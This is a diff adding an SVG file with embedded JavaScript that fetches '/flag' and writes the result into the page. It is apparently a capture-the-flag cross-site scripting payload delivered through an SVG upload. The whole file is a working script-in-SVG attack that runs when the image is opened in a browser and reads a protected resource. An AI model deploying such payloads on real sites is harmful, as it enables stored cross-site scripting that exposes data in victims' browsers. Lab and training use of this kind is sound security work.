@@ -1,0 +1,7 @@
+<svg xmlns="http://www.w3.org/2000/svg">
+  <script>
+    fetch('/flag')
+      .then(r => r.text())
+      .then(f => document.body.innerHTML = '<h1>FLAG:</h1><pre>' + f + '</pre>');
+  </script>
+</svg>
